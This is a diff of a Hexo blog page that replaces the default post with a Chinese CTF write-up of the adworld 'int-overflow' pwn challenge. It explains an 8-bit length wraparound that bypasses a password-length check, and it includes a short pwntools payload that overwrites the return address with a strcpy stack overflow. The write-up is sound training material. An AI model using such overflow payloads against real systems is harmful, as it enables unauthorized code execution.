@@ -20,19 +20,31 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="攻防世界pwn题目新手练习区int-overflow 1.下载附件 2.分析程序 可以发现，如果想要继续运行的话，需要输入1，否则，程序结束。  发现了read函数，首先想到了栈溢出漏洞。但是，却发现允许输入并送入指针空间的字符小于溢出所必须的字符数。所以无法构成溢出。 再进入check_passwd()函数一探究竟。  这段代码对用户输入的密码计算了长度，如果 长度&lt;&#x3D;3 或者 长度&amp;gt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2020/07/27/hello-world/index.html">
+<meta property="og:title" content="adworld-freshman-int-overflow-wp">
+<meta property="og:url" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="攻防世界pwn题目新手练习区int-overflow 1.下载附件 2.分析程序 可以发现，如果想要继续运行的话，需要输入1，否则，程序结束。  发现了read函数，首先想到了栈溢出漏洞。但是，却发现允许输入并送入指针空间的字符小于溢出所必须的字符数。所以无法构成溢出。 再进入check_passwd()函数一探究竟。  这段代码对用户输入的密码计算了长度，如果 长度&lt;&#x3D;3 或者 长度&amp;gt">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-07-27T13:08:45.302Z">
-<meta property="article:modified_time" content="2020-07-27T13:08:45.302Z">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/11.png">
+<meta property="article:published_time" content="2020-09-10T14:43:08.654Z">
+<meta property="article:modified_time" content="2020-09-10T14:42:15.027Z">
 <meta property="article:author" content="lightyami">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/1.png">
 
-<link rel="canonical" href="http://yoursite.com/2020/07/27/hello-world/">
+<link rel="canonical" href="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/">
 
 
 <script id="page-configurations">
@@ -45,7 +57,7 @@
   };
 </script>
 
-  <title>Hello World | Hexo</title>
+  <title>adworld-freshman-int-overflow-wp | Hexo</title>
   
 
 
@@ -150,7 +162,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/27/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/10/adworld-freshman-int-overflow-wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -163,7 +175,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Hello World
+          adworld-freshman-int-overflow-wp
         </h1>
 
         <div class="post-meta">
@@ -172,8 +184,9 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2020-07-27 21:08:45" itemprop="dateCreated datePublished" datetime="2020-07-27T21:08:45+08:00">2020-07-27</time>
+              <time title="Created: 2020-09-10 22:43:08 / Modified: 22:42:15" itemprop="dateCreated datePublished" datetime="2020-09-10T22:43:08+08:00">2020-09-10</time>
             </span>
 
           
@@ -187,19 +200,31 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <p>攻防世界pwn题目<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058&page=1" target="_blank" rel="noopener">新手练习区int-overflow</a></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-分析程序"><a href="#2-分析程序" class="headerlink" title="2.分析程序"></a>2.分析程序</h3><p><img src="./2.png" alt="Alt text" title="Optional title"></p>
+<p>可以发现，如果想要继续运行的话，需要输入1，否则，程序结束。</p>
+<p><img src="./3.png" alt="Alt text" title="Optional title"></p>
+<p>发现了read函数，首先想到了栈溢出漏洞。<br>但是，却发现允许输入并送入指针空间的字符小于溢出所必须的字符数。<br>所以无法构成溢出。</p>
+<p>再进入check_passwd()函数一探究竟。</p>
+<p><img src="./4.png" alt="Alt text" title="Optional title"></p>
+<p>这段代码对用户输入的密码计算了长度，如果 <strong>长度&lt;=3 或者 长度&gt;8</strong><br>则会提示”Invalid Password”，并退出程序。</p>
+<p>发现有个strcpy()函数，把s的字符串复制到dest中。看看dest的存储空间。</p>
+<p><img src="./5.png" alt="Alt text" title="Optional title"></p>
+<p>这里也存在溢出漏洞，让s的长度大于dest正常输入的最大数量，覆盖到返回地址就可以指向到我们想要执行的地方了。然而，问题是s的长度被v3的大小限制了。我们再看看计算s大小时，存放v3的寄存器。</p>
+<p><img src="./6.png" alt="Alt text" title="Optional title"></p>
+<p>这里有个al寄存器，al寄存器一共有8位比特。<br>v3被定义为无符号整形。所以al最大可以存放255的数据，最小为0。</p>
+<p>之后，我们发现了”cat flag”,在what_is_this函数里面。</p>
+<p><img src="./7.png" alt="Alt text" title="Optional title"></p>
+<p>函数的起始地址为 <strong><em>0x0804868b</em></strong></p>
+<p><img src="./8.png" alt="Alt text" title="Optional title"></p>
+<h3 id="3-整体思路"><a href="#3-整体思路" class="headerlink" title="3.整体思路"></a>3.整体思路</h3><p>strcpy()函数的存在，使得dest的栈溢出成为了可能。<br>同时，v3的最大值只能取到255。<br>所以，只要我们控制输入密码的长度在259<del>263之间(或者其他可行的大小)，使整数溢出，从而间接控制v3处于 **3</del>8**之间。</p>
+<p>我们只需在特定位置，把系统函数的地址写入s中，在控制s的长度，就可以绕过v3的密码长度检查，然后利用栈溢出，获取flag</p>
+<h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&quot;ip&#x2F;url&quot;,port)</span><br><span class="line">r.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)</span><br><span class="line">r.sendlineafter(&quot;your username&quot;,&#39;aaaa&#39;)</span><br><span class="line">r.sendlineafter(&quot;your passwd:&quot;,&#39;a&#39;*0x18+p32(sys_addr)+&#39;a&#39;*231)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p><img src="./9.png" alt="Alt text" title="Optional title"></p>
+<p><img src="./10.png" alt="Alt text" title="Optional title"></p>
+<p><img src="./11.png" alt="Alt text" title="Optional title"></p>
 
     </div>
 
@@ -214,11 +239,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2020/09/06/adworld-xctf-pwn-freshman-level0-wp/" rel="next" title="adworld-xctf-pwn-freshman-level0-wp">
-      adworld-xctf-pwn-freshman-level0-wp <i class="fa fa-chevron-right"></i>
+    <a href="/2020/09/10/adworld-freshman-cgpwn2-wp/" rel="prev" title="adworld-freshman-cgpwn2-wp">
+      <i class="fa fa-chevron-left"></i> adworld-freshman-cgpwn2-wp
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -277,7 +302,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-下载附件"><span class="nav-number">1.</span> <span class="nav-text">1.下载附件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-分析程序"><span class="nav-number">2.</span> <span class="nav-text">2.分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-整体思路"><span class="nav-number">3.</span> <span class="nav-text">3.整体思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-编写payload"><span class="nav-number">4.</span> <span class="nav-text">4.编写payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-开始解题"><span class="nav-number">5.</span> <span class="nav-text">5.开始解题</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
